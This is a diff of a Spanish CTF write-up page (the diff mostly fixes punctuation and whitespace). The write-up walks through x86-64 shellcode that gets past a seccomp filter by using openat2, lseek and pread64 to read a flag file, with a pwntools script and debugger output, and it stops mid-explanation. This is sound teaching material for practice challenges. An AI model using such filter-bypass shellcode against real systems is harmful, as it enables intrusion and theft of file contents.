@@ -144,32 +144,32 @@
 <section class="post" id="reversing">
 <br><h3 class="post-title">Reversing</h3><br>
 
-<p class="plain-text">Si ejecutamos el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/CampoDeMarte/ShellCode/bin">binario</a> nos pide un shellcode donde enviamos <code class="language-plaintext highlighter-rouge">16 bytes</code>, nos devuelve un mensaje y corrompe de alguna forma inesperada que analizaremos</p>
+<p class="plain-text">Si ejecutamos el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/CampoDeMarte/ShellCode/bin">binario</a> nos pide un shellcode donde enviamos <code class="language-plaintext highlighter-rouge">16 bytes</code>, nos devuelve un mensaje y corrompe de alguna forma inesperada que analizaremos.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ./bin</span><span class="p">
 Upload your shellcode.
 AAAAAAAABBBBBBBB
-zsh: segmentation fault (core dumped)  ./bin  </span>
+zsh: segmentation fault (core dumped)  ./bin</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Iniciamos desensamblando la función <code class="language-plaintext highlighter-rouge">main</code>, esta llama a 2 funciones las cuales renombramos como <code class="language-plaintext highlighter-rouge">setup</code> y <code class="language-plaintext highlighter-rouge">vuln</code> debido a que originalmente no hay simbolos</p>
+<p class="plain-text">Iniciamos desensamblando la función <code class="language-plaintext highlighter-rouge">main</code>, esta llama a 2 funciones las cuales renombramos como <code class="language-plaintext highlighter-rouge">setup</code> y <code class="language-plaintext highlighter-rouge">vuln</code> debido a que originalmente no hay simbolos.</p>
 <a href="/challenges/shellcode/1.png" target="_blank"><div><p><img src="/challenges/shellcode/1.png"></p></div></a>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">setup</code> intenta abrir con open un archivo llamado <code class="language-plaintext highlighter-rouge">flag</code>, si el valor de retorno es menor a <code class="language-plaintext highlighter-rouge">0</code> muestra un mensaje con <code class="language-plaintext highlighter-rouge">puts</code> y sale del programa con <code class="language-plaintext highlighter-rouge">exit</code></p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">setup</code> intenta abrir con open un archivo llamado <code class="language-plaintext highlighter-rouge">flag</code>, si el valor de retorno es menor a <code class="language-plaintext highlighter-rouge">0</code> muestra un mensaje con <code class="language-plaintext highlighter-rouge">puts</code> y sale del programa con <code class="language-plaintext highlighter-rouge">exit</code>.</p>
 <a href="/challenges/shellcode/2.png" target="_blank"><div><p><img src="/challenges/shellcode/2.png"></p></div></a>
 
-<p class="plain-text">Para evitar este error crearemos un archivo llamado <code class="language-plaintext highlighter-rouge">flag</code> con un texto para pruebas</p>
+<p class="plain-text">Para evitar este error crearemos un archivo llamado <code class="language-plaintext highlighter-rouge">flag</code> con un texto para pruebas.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ echo </span><span class="am">'FLAG{f4k3_fl4g_4_t35t1ng}' </span><span class="p">> flag  </span>
+<code><span class="ve">❯ echo </span><span class="am">'FLAG{f4k3_fl4g_4_t35t1ng}' </span><span class="p">> flag</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">vuln</code> reserva un espacio con <code class="language-plaintext highlighter-rouge">mmap</code> al cual asigna permisos <code class="language-plaintext highlighter-rouge">7</code> o <code class="language-plaintext highlighter-rouge">rwx</code>, luego recibe un datos en un buffer con <code class="language-plaintext highlighter-rouge">read</code>, realiza una llamada a la función <code class="language-plaintext highlighter-rouge">seccomp</code> y llama a <code class="language-plaintext highlighter-rouge">rax</code> que contiene el shellcode recibido previamente</p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">vuln</code> reserva un espacio con <code class="language-plaintext highlighter-rouge">mmap</code> al cual asigna permisos <code class="language-plaintext highlighter-rouge">7</code> o <code class="language-plaintext highlighter-rouge">rwx</code>, luego recibe un datos en un buffer con <code class="language-plaintext highlighter-rouge">read</code>, realiza una llamada a la función <code class="language-plaintext highlighter-rouge">seccomp</code> y llama a <code class="language-plaintext highlighter-rouge">rax</code> que contiene el shellcode recibido previamente.</p>
 <a href="/challenges/shellcode/3.png" target="_blank"><div><p><img src="/challenges/shellcode/3.png"></p></div></a>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">seccomp</code> establece reglas para evitar que se ejecuten ciertas syscalls</p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">seccomp</code> establece reglas para evitar que se ejecuten ciertas syscalls.</p>
 <a href="/challenges/shellcode/4.png" target="_blank"><div><p><img src="/challenges/shellcode/4.png"></p></div></a>
 
-<p class="plain-text">Podemos usar <code class="language-plaintext highlighter-rouge">seccomp-tools</code> para ver mejor las funciones restringidas, al parecer no podemos llamar <code class="language-plaintext highlighter-rouge">execve</code> o <code class="language-plaintext highlighter-rouge">execveat</code> para ejecutar comandos ni funciones para leer archivos como <code class="language-plaintext highlighter-rouge">open</code> o <code class="language-plaintext highlighter-rouge">read</code>, esto limita bastante nuestro posible shellcode</p>
+<p class="plain-text">Podemos usar <code class="language-plaintext highlighter-rouge">seccomp-tools</code> para ver mejor las funciones restringidas, al parecer no podemos llamar <code class="language-plaintext highlighter-rouge">execve</code> o <code class="language-plaintext highlighter-rouge">execveat</code> para ejecutar comandos ni funciones para leer archivos como <code class="language-plaintext highlighter-rouge">open</code> o <code class="language-plaintext highlighter-rouge">read</code>, esto limita bastante nuestro posible shellcode.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ seccomp-tools</span><span class="p"> dump ./bin
 Upload your shellcode.
@@ -177,7 +177,7 @@ Upload your shellcode.
  line  CODE  JT   JF      K
 =================================
  0000: 0x20 0x00 0x00 0x00000004  A = arch
- 0001: 0x15 0x00 0x0f 0xc000003e  if (A != </span><span class="am">ARCH_X86_64</span><span class="p">) goto 0017  
+ 0001: 0x15 0x00 0x0f 0xc000003e  if (A != </span><span class="am">ARCH_X86_64</span><span class="p">) goto 0017
  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
  0003: 0x35 0x00 0x01 0x40000000  if (A &lt </span><span class="ve">0x40000000</span><span class="p">) goto 0005
  0004: 0x15 0x00 0x0c 0xffffffff  if (A != </span><span class="ve">0xffffffff</span><span class="p">) goto 0017
@@ -201,12 +201,12 @@ Upload your shellcode.
 <section class="post" id="exploitation">
 <br><h3 class="post-title">Explotación</h3><br>
 
-<p class="plain-text">Sabemos que lo que enviemos se interpretará como instrucciones ensamblador, para comprobarlo enviaremos como shellcode un <code class="language-plaintext highlighter-rouge">int3</code> que actuará como breakpoint en el debugger y algunos <code class="language-plaintext highlighter-rouge">nops</code> extra para asegurarnos que se ejecute correctamente</p>
+<p class="plain-text">Sabemos que lo que enviemos se interpretará como instrucciones ensamblador, para comprobarlo enviaremos como shellcode un <code class="language-plaintext highlighter-rouge">int3</code> que actuará como breakpoint en el debugger y algunos <code class="language-plaintext highlighter-rouge">nops</code> extra para asegurarnos que se ejecute correctamente.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, asm
 
-shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./bin"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)  
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./bin"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
 
 shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
     int3
@@ -219,9 +219,9 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">".</span><sp
 shell.interactive()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al ejecutar el exploit llega al breakpoint y se detiene al inicio de ejecutar los <code class="language-plaintext highlighter-rouge">nops</code></p>
+<p class="plain-text">Al ejecutar el exploit llega al breakpoint y se detiene al inicio de ejecutar los <code class="language-plaintext highlighter-rouge">nops</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">Program received signal SIGTRAP, Trace/breakpoint trap.  
+<code><span class="p">Program received signal SIGTRAP, Trace/breakpoint trap.
 </span><span class="az">0x00007089beafc001</span><span class="p"> in</span><span class="am"> ??</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> x/4i $rip-1
 </span><span class="az">   0x7089beafc000</span><span class="p">:</span><span class="ve">      int3</span><span class="p">
@@ -231,26 +231,26 @@ shell.interactive()</span>
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Funciones como <code class="language-plaintext highlighter-rouge">open</code> o <code class="language-plaintext highlighter-rouge">openat</code> estan limitadas por <code class="language-plaintext highlighter-rouge">seccomp</code> e impiden abrir el archivo, sin embargo no esta <code class="language-plaintext highlighter-rouge">openat2</code> asi que podemos utilizarla para hacerlo, según documentación el argumento <code class="language-plaintext highlighter-rouge">dirfd</code> podemos establecerlo en <code class="language-plaintext highlighter-rouge">AT_FDCWD</code> o <code class="language-plaintext highlighter-rouge">-100</code> para rutas relativas, el <code class="language-plaintext highlighter-rouge">pathname</code> será el archivo <code class="language-plaintext highlighter-rouge">flag</code> el cual nos interesará leer</p>
+<p class="plain-text">Funciones como <code class="language-plaintext highlighter-rouge">open</code> o <code class="language-plaintext highlighter-rouge">openat</code> están limitadas por <code class="language-plaintext highlighter-rouge">seccomp</code> e impiden abrir el archivo, sin embargo no está <code class="language-plaintext highlighter-rouge">openat2</code> así que podemos utilizarla para hacerlo, según documentación el argumento <code class="language-plaintext highlighter-rouge">dirfd</code> podemos establecerlo en <code class="language-plaintext highlighter-rouge">AT_FDCWD</code> o <code class="language-plaintext highlighter-rouge">-100</code> para rutas relativas, el <code class="language-plaintext highlighter-rouge">pathname</code> será el archivo <code class="language-plaintext highlighter-rouge">flag</code> el cual nos interesará leer.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">openat2(</span><span class="no">int</span><span class="p"> dirfd,</span><span class="o"> const</span><span class="no"> char</span><span class="o"> *</span><span class="p">pathname,</span><span class="no"> struct</span><span class="p"> open_how </span><span class="o">*</span><span class="p">how, </span><span class="na">size_t</span><span class="p"> size);  </span>
+<code><span class="p">openat2(</span><span class="no">int</span><span class="p"> dirfd,</span><span class="o"> const</span><span class="no"> char</span><span class="o"> *</span><span class="p">pathname,</span><span class="no"> struct</span><span class="p"> open_how </span><span class="o">*</span><span class="p">how, </span><span class="na">size_t</span><span class="p"> size);</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El tercer argumento es una estructura <code class="language-plaintext highlighter-rouge">open_how</code>, podemos establecer todas sus partes a <code class="language-plaintext highlighter-rouge">0</code> indicando modo <code class="language-plaintext highlighter-rouge">O_RDONLY</code>, el tamaño de la estructura es de <code class="language-plaintext highlighter-rouge">24</code> bytes</p>
+<p class="plain-text">El tercer argumento es una estructura <code class="language-plaintext highlighter-rouge">open_how</code>, podemos establecer todas sus partes a <code class="language-plaintext highlighter-rouge">0</code> indicando modo <code class="language-plaintext highlighter-rouge">O_RDONLY</code>, el tamaño de la estructura es de <code class="language-plaintext highlighter-rouge">24</code> bytes.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="no">struct</span><span class="na"> open_how</span><span class="p"> {
     </span><span class="no">u64</span><span class="p">  flags;    </span><span class="c1">/* O_* flags */</span><span class="p">
-    </span><span class="no">u64</span><span class="p">  mode;     </span><span class="c1">/* Mode for O_{CREAT,TMPFILE} */</span><span class="p">  
+    </span><span class="no">u64</span><span class="p">  mode;     </span><span class="c1">/* Mode for O_{CREAT,TMPFILE} */</span><span class="p">
     </span><span class="no">u64</span><span class="p">  resolve;  </span><span class="c1">/* RESOLVE_* flags */</span><span class="p">
 };</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ya conocemos los argumentos que debemos establecer, el <code class="language-plaintext highlighter-rouge">size</code> lo establecemos el <code class="language-plaintext highlighter-rouge">0x18</code> o <code class="language-plaintext highlighter-rouge">24</code> que es el tamaño de la estructura <code class="language-plaintext highlighter-rouge">open_how</code>, con ello completamos todo</p>
+<p class="plain-text">Ya conocemos los argumentos que debemos establecer, el <code class="language-plaintext highlighter-rouge">size</code> lo establecemos el <code class="language-plaintext highlighter-rouge">0x18</code> o <code class="language-plaintext highlighter-rouge">24</code> que es el tamaño de la estructura <code class="language-plaintext highlighter-rouge">open_how</code>, con ello completamos todo.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">openat2(</span><span class="o">-</span><span class="mi">100</span><span class="p">,</span><span class="s"> "flag"</span><span class="p">, [</span><span class="mi">0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">], </span><span class="mi">0x18</span><span class="p">);  </span>
+<code><span class="p">openat2(</span><span class="o">-</span><span class="mi">100</span><span class="p">,</span><span class="s"> "flag"</span><span class="p">, [</span><span class="mi">0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">], </span><span class="mi">0x18</span><span class="p">);</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Si lo pasamos a ensamblador se ve de la siguiente forma, guardamos en <code class="language-plaintext highlighter-rouge">rdi</code> el valor <code class="language-plaintext highlighter-rouge">-100</code>, en <code class="language-plaintext highlighter-rouge">rsi</code> un puntero a la string <code class="language-plaintext highlighter-rouge">flag</code>, en <code class="language-plaintext highlighter-rouge">rdx</code> la estructura <code class="language-plaintext highlighter-rouge">open_how</code> y finalmente en <code class="language-plaintext highlighter-rouge">r10</code> la longitud, y en <code class="language-plaintext highlighter-rouge">rax</code> el syscall NR que para <code class="language-plaintext highlighter-rouge">openat2</code> es <code class="language-plaintext highlighter-rouge">0x1b5</code></p>
+<p class="plain-text">Si lo pasamos a ensamblador se ve de la siguiente forma, guardamos en <code class="language-plaintext highlighter-rouge">rdi</code> el valor <code class="language-plaintext highlighter-rouge">-100</code>, en <code class="language-plaintext highlighter-rouge">rsi</code> un puntero a la string <code class="language-plaintext highlighter-rouge">flag</code>, en <code class="language-plaintext highlighter-rouge">rdx</code> la estructura <code class="language-plaintext highlighter-rouge">open_how</code> y finalmente en <code class="language-plaintext highlighter-rouge">r10</code> la longitud, y en <code class="language-plaintext highlighter-rouge">rax</code> el syscall NR que para <code class="language-plaintext highlighter-rouge">openat2</code> es <code class="language-plaintext highlighter-rouge">0x1b5</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="o">    xor </span><span class="mi">rdi</span><span class="p">,</span><span class="mi"> rdi</span><span class="c1">    # $rdi = 0x0
     </span><span class="o">push</span><span class="mi"> 0x67616c66</span><span class="c1"> # $rsp = "flag"
@@ -260,7 +260,7 @@ shell.interactive()</span>
     </span><span class="o">push</span><span class="mi"> rdi</span><span class="c1">        # NULL
     </span><span class="o">sub</span><span class="mi"> rdi</span><span class="p">,</span><span class="mi"> 0x64</span><span class="c1">   # space for data
     </span><span class="o">push</span><span class="mi"> rsp</span><span class="c1">        # structure
-    </span><span class="o">pop</span><span class="mi"> rdx</span><span class="c1">         # $rdx = structure  
+    </span><span class="o">pop</span><span class="mi"> rdx</span><span class="c1">         # $rdx = structure
     </span><span class="o">push</span><span class="mi"> 0x18</span><span class="c1">       # len
     </span><span class="o">pop</span><span class="mi"> r10</span><span class="c1">         # $r10 = len
     </span><span class="o">push</span><span class="mi"> 0x1b5</span><span class="c1">      # openat2()
@@ -270,7 +270,7 @@ shell.interactive()</span>
     </span><span class="o">syscall</span><span class="c1">         # syscall</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ejecutamos el exploit y al llegar al breakpoint comprobamos que los argumentos esten establecidos correctamente, luego ejecutamos al <code class="language-plaintext highlighter-rouge">syscall</code> y el valor de retorno es <code class="language-plaintext highlighter-rouge">0x4</code> que es un descriptor de archivo el cual hace referencia al archivo <code class="language-plaintext highlighter-rouge">flag</code></p>
+<p class="plain-text">Ejecutamos el exploit y al llegar al breakpoint comprobamos que los argumentos esten establecidos correctamente, luego ejecutamos la <code class="language-plaintext highlighter-rouge">syscall</code> y el valor de retorno es <code class="language-plaintext highlighter-rouge">0x4</code> que es un descriptor de archivo el cual hace referencia al archivo <code class="language-plaintext highlighter-rouge">flag</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">Program received signal SIGTRAP, Trace/breakpoint trap.
 </span><span class="az">0x00007155a6e2901f </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
@@ -279,7 +279,7 @@ shell.interactive()</span>
 </span><span class="ro">pwndbg></span><span class="p"> x/s $rsi
 </span><span class="az">0x7ffd9227a780</span><span class="p">: "flag"
 </span><span class="ro">pwndbg></span><span class="p"> x/3gx $rdx
-</span><span class="az">0x7ffd9227a768</span><span class="p">: 0x0000000000000000      0x0000000000000000  
+</span><span class="az">0x7ffd9227a768</span><span class="p">: 0x0000000000000000      0x0000000000000000
 </span><span class="az">0x7ffd9227a778</span><span class="p">: 0x0000000000000000
 </span><span class="ro">pwndbg></span><span class="p"> p/x $r10
 </span><span class="az">$2</span><span class="p"> = 0x18
@@ -288,7 +288,7 @@ shell.interactive()</span>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> x/i $rip
-=></span><span class="az"> 0x7155a6e2901f</span><span class="p">:</span><span class="ve">      syscall  </span><span class="p">
+=></span><span class="az"> 0x7155a6e2901f</span><span class="p">:</span><span class="ve">      syscall</span><span class="p">
 </span><span class="ro">pwndbg> </span><span class="p">ni
 </span><span class="az">0x00007155a6e29021 </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> p/x $rax
@@ -296,19 +296,19 @@ shell.interactive()</span>
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Una vez abrimos el archivo, podemos llamar a <code class="language-plaintext highlighter-rouge">lseek</code> para saber la longitud de este</p>
+<p class="plain-text">Una vez abrimos el archivo, podemos llamar a <code class="language-plaintext highlighter-rouge">lseek</code> para saber la longitud de este.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">lseek(</span><span class="no">int</span><span class="p"> fd,</span><span class="na"> off_t</span><span class="p"> offset,</span><span class="no"> int</span><span class="p"> whence);  </span>
+<code><span class="p">lseek(</span><span class="no">int</span><span class="p"> fd,</span><span class="na"> off_t</span><span class="p"> offset,</span><span class="no"> int</span><span class="p"> whence);</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El primer argumento es el descriptor del archivo, podemos utilizar el valor de retorno que nos devolvió, el offset lo podemos establecer en <code class="language-plaintext highlighter-rouge">0</code> y whence en <code class="language-plaintext highlighter-rouge">SEE_END</code> o <code class="language-plaintext highlighter-rouge">2</code> indicando el punto de referencia, de esta forma contará desde el inicio hasta el final</p>
+<p class="plain-text">El primer argumento es el descriptor del archivo, podemos utilizar el valor de retorno que nos devolvió, el offset lo podemos establecer en <code class="language-plaintext highlighter-rouge">0</code> y whence en <code class="language-plaintext highlighter-rouge">SEE_END</code> o <code class="language-plaintext highlighter-rouge">2</code> indicando el punto de referencia, de esta forma contará desde el inicio hasta el final.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">lseek(</span><span class="mi">4</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 2</span><span class="p">);  </span>
+<code><span class="p">lseek(</span><span class="mi">4</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 2</span><span class="p">);</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podemos pasarlo a ensamblador, en <code class="language-plaintext highlighter-rouge">rdi</code> guardamos el valor de retorno de <code class="language-plaintext highlighter-rouge">open</code>, en <code class="language-plaintext highlighter-rouge">rsi</code> guardamos <code class="language-plaintext highlighter-rouge">0</code> y en <code class="language-plaintext highlighter-rouge">rdx</code> un <code class="language-plaintext highlighter-rouge">2</code>, ya con ello podemos hacer la <code class="language-plaintext highlighter-rouge">syscall</code> a <code class="language-plaintext highlighter-rouge">lseek</code></p>
+<p class="plain-text">Podemos pasarlo a ensamblador, en <code class="language-plaintext highlighter-rouge">rdi</code> guardamos el valor de retorno de <code class="language-plaintext highlighter-rouge">open</code>, en <code class="language-plaintext highlighter-rouge">rsi</code> guardamos <code class="language-plaintext highlighter-rouge">0</code> y en <code class="language-plaintext highlighter-rouge">rdx</code> un <code class="language-plaintext highlighter-rouge">2</code>, ya con ello podemos hacer la <code class="language-plaintext highlighter-rouge">syscall</code> a <code class="language-plaintext highlighter-rouge">lseek</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="o">    xchg </span><span class="mi">rax</span><span class="p">,</span><span class="mi"> rdi</span><span class="c1">   # $rdi = descriptor  
+<code><span class="o">    xchg </span><span class="mi">rax</span><span class="p">,</span><span class="mi"> rdi</span><span class="c1">   # $rdi = descriptor
     </span><span class="o">push</span><span class="mi"> 0x2</span><span class="c1">        # whence
     </span><span class="o">pop</span><span class="mi"> rdx</span><span class="c1">         # $rdx = whence
     </span><span class="o">xor</span><span class="mi"> rsi</span><span class="p">,</span><span class="mi"> rsi</span><span class="c1">    # $rsi = offset
@@ -319,9 +319,9 @@ shell.interactive()</span>
     </span><span class="o">syscall</span><span class="c1">         # syscall</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Cuando llegamos al breakpoint comprobamos que los argumentos esten establecidos correctamente, luego ejecutamos al <code class="language-plaintext highlighter-rouge">syscall</code> y el valor de retorno es <code class="language-plaintext highlighter-rouge">0x1a</code> que es la longitud total del archivo, ahora sabemos cuantos bytes leer del archivo abierto</p>
+<p class="plain-text">Cuando llegamos al breakpoint comprobamos que los argumentos estén establecidos correctamente, luego ejecutamos al <code class="language-plaintext highlighter-rouge">syscall</code> y el valor de retorno es <code class="language-plaintext highlighter-rouge">0x1a</code> que es la longitud total del archivo, ahora sabemos cuantos bytes leer del archivo abierto.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">Program received signal SIGTRAP, Trace/breakpoint trap.  
+<code><span class="p">Program received signal SIGTRAP, Trace/breakpoint trap.
 </span><span class="az">0x0000796d23e5802c </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> p/x $rdi
 </span><span class="az">$1</span><span class="p"> = 0x4
@@ -334,7 +334,7 @@ shell.interactive()</span>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> x/i $rip
-=></span><span class="az"> 0x796d23e5802c</span><span class="p">:</span><span class="ve">      syscall  </span><span class="p">
+=></span><span class="az"> 0x796d23e5802c</span><span class="p">:</span><span class="ve">      syscall</span><span class="p">
 </span><span class="ro">pwndbg></span><span class="p"> ni
 </span><span class="az">0x0000796d23e5802e</span><span class="p"> in</span><span class="am"> ??</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> p/x $rax
@@ -342,31 +342,31 @@ shell.interactive()</span>
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Aunque la función <code class="language-plaintext highlighter-rouge">read</code> esta bloqueada podemos usar funciones como <code class="language-plaintext highlighter-rouge">pread64</code>, el primer argumento sigue siendo el descriptor del archivo, el segundo el buffer donde se escribirá el contenido, el tercero la longitud y offset lo podemos establecer a <code class="language-plaintext highlighter-rouge">0</code></p>
+<p class="plain-text">Aunque la función <code class="language-plaintext highlighter-rouge">read</code> esta bloqueada podemos usar funciones como <code class="language-plaintext highlighter-rouge">pread64</code>, el primer argumento sigue siendo el descriptor del archivo, el segundo el buffer donde se escribirá el contenido, el tercero la longitud y offset lo podemos establecer a <code class="language-plaintext highlighter-rouge">0</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">pread64(</span><span class="no">int </span><span class="p">fd,</span><span class="no"> void</span><span class="o"> *</span><span class="p">buf,</span><span class="na"> size_t</span><span class="p"> count,</span><span class="na"> off_t</span><span class="p"> offset);  </span>
+<code><span class="p">pread64(</span><span class="no">int </span><span class="p">fd,</span><span class="no"> void</span><span class="o"> *</span><span class="p">buf,</span><span class="na"> size_t</span><span class="p"> count,</span><span class="na"> off_t</span><span class="p"> offset);</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">pread64(</span><span class="mi">4</span><span class="p">, </span><span class="mi">$rsp</span><span class="p">, </span><span class="mi">0x1a</span><span class="p">,</span><span class="mi"> 0</span><span class="p">);  </span>
+<code><span class="p">pread64(</span><span class="mi">4</span><span class="p">, </span><span class="mi">$rsp</span><span class="p">, </span><span class="mi">0x1a</span><span class="p">,</span><span class="mi"> 0</span><span class="p">);</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Lo pasamos a ensamblador, en <code class="language-plaintext highlighter-rouge">rdi</code> ya está el descriptor, en <code class="language-plaintext highlighter-rouge">rsi</code> establecemos la dirección del stack, en <code class="language-plaintext highlighter-rouge">rdx</code> el valor de retorno que recibimos de <code class="language-plaintext highlighter-rouge">lseek</code> y en <code class="language-plaintext highlighter-rouge">r10</code> simplemente <code class="language-plaintext highlighter-rouge">0</code>, en <code class="language-plaintext highlighter-rouge">rax</code> almacenamos el syscall NR de <code class="language-plaintext highlighter-rouge">pread64</code> y la ejecutamos</p>
+<p class="plain-text">Lo pasamos a ensamblador, en <code class="language-plaintext highlighter-rouge">rdi</code> ya está el descriptor, en <code class="language-plaintext highlighter-rouge">rsi</code> establecemos la dirección del stack, en <code class="language-plaintext highlighter-rouge">rdx</code> el valor de retorno que recibimos de <code class="language-plaintext highlighter-rouge">lseek</code> y en <code class="language-plaintext highlighter-rouge">r10</code> simplemente <code class="language-plaintext highlighter-rouge">0</code>, en <code class="language-plaintext highlighter-rouge">rax</code> almacenamos el syscall NR de <code class="language-plaintext highlighter-rouge">pread64</code> y la ejecutamos.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="o">    push </span><span class="mi">rsp</span><span class="c1">        # stack
     </span><span class="o">pop</span><span class="mi"> rsi</span><span class="c1">         # $rsi = buffer
     </span><span class="o">xchg</span><span class="mi"> rdx</span><span class="p">,</span><span class="mi"> rax</span><span class="c1">   # $rdx = len
     </span><span class="o">xor</span><span class="mi"> r10</span><span class="p">,</span><span class="mi"> r10</span><span class="c1">    # $r10 = offset
     </span><span class="o">push</span><span class="mi"> 0x11</span><span class="c1">       # pread64()
-    </span><span class="o">pop</span><span class="mi"> rax</span><span class="c1">         # $rax = pread64()  
+    </span><span class="o">pop</span><span class="mi"> rax</span><span class="c1">         # $rax = pread64()
 
     </span><span class="o">int3</span><span class="c1">            # breakpoint
     </span><span class="o">syscall</span><span class="c1">         # syscall</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al llegar al breakpoint comprobamos que los argumentos sean los correctos, y al ejecutar la <code class="language-plaintext highlighter-rouge">syscall</code> aunque el valor de retorno sigue siendo la longitud del archivo en el stack ahora se almacena el contenido del archivo <code class="language-plaintext highlighter-rouge">flag</code> que escribimos al inicio</p>
+<p class="plain-text">Al llegar al breakpoint comprobamos que los argumentos sean los correctos, y al ejecutar la <code class="language-plaintext highlighter-rouge">syscall</code> aunque el valor de retorno sigue siendo la longitud del archivo en el stack ahora se almacena el contenido del archivo <code class="language-plaintext highlighter-rouge">flag</code> que escribimos al inicio.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">Program received signal SIGTRAP, Trace/breakpoint trap.  
+<code><span class="p">Program received signal SIGTRAP, Trace/breakpoint trap.
 </span><span class="az">0x0000746d23e5803f </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> p/x $rdi
 </span><span class="az">$1</span><span class="p"> = 0x4
@@ -387,23 +387,23 @@ shell.interactive()</span>
 </span><span class="ro">pwndbg></span><span class="p"> ni
 </span><span class="az">0x000070707e19903a</span><span class="p"> in</span><span class="am"> ??</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> x/s $rsp
-</span><span class="az">0x7ffcad51d948</span><span class="p">: "FLAG{f4k3_fl4g_4_t35t1ng}\n"  
+</span><span class="az">0x7ffcad51d948</span><span class="p">: "FLAG{f4k3_fl4g_4_t35t1ng}\n"
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Finalmente podemos usar la función <code class="language-plaintext highlighter-rouge">write</code> para mostrar el contenido de la <code class="language-plaintext highlighter-rouge">flag</code>, aqui el primer argumento es el descriptor que podemos establecer en <code class="language-plaintext highlighter-rouge">2</code> para la salida, luego lo que queremos enviar a el en este caso será el contenido del registro <code class="language-plaintext highlighter-rouge">rsp</code> donde almacenamos el contenido del archivo y el último la longitud del archivo</p>
